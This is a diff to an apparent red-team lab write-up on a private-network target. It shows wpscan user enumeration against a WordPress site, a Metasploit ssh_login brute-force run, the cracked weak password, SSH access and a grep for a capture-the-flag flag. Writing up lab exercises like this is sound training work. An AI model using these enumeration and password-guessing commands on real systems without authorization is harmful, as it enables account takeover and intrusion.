@@ -38,7 +38,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Start with a user enumeration of the Wordpress website using Wpscan
         - `wpscan --url http://192.168.1.110/wordpress --enumerate u`
         - ![WPScan](Images/Wpscan.png "WPScan")
-      - Using the ssh module in Metasploit we will break into Micheals account
+      - Using the ssh module in Metasploit we will break into Michael's account
         - `msfconsole`
         - `search ssh`
         - `use auxiliary/scanner/ssh/ssh_login`
@@ -51,6 +51,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - `set stop_on_success true`
         - ![Metasploit](Images/Metasploit.png "Metasploit SSH Cracker") 
         - Michael's password is michael
+      - Now that we have access to Michael's account we ssh in and search the website filed for the first flag
+        - `ssh michael@192.168.1.110`
+        - `cd /var/www/html`
+        - `grep -nr 'flag1'`
+        - ![flag1](Images/flag1.png "First flag location") 
   - `flag2`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Exploit Used**
       - Metasploit ssh_login module using the usernames acquired from wpscan and a general password list
